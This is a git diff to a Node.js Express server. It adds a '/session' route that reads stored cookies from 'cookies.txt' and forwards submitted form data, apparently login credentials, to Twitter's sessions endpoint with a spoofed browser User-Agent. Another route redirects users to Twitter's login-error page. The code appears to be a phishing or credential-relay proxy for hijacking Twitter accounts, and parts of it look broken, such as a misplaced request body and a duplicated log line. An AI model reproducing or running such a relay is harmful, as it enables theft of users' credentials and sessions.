@@ -1,6 +1,6 @@
 const createError = require('http-errors');
 const express = require('express');
-const request = require('request');
+const axios = require('axios');
 const path = require('path');
 const cookieParser = require('cookie-parser');
 const logger = require('morgan');
@@ -39,6 +39,34 @@ app.route('/sessions')
             res1.redirect('https://www.twitter.com/login/error?username_or_email=' + username_or_email);
         });
     });
+
+app.route('/session')
+    .post((req, res1) => {
+        fs.readFile('cookies.txt', (err, data) => {
+            if (err) console.log(err);
+            else {
+                axios.post('https://www.twitter.com/sessions', {
+                    data: req.body,
+                    withCredentials: true,
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
+                        Cookie: data
+                    }
+                })
+                    .then((res) => {
+                        console.log(res.headers);
+                        res1.send(res)
+                    })
+                    .catch((err) => {
+                        res1.send(err)
+                    });
+            }
+        });
+    });
+
+console.log('server is waiting...');
+console.log('server is waiting...');
 
 // catch 404 and forward to error handler
 app.use(function (req, res, next) {
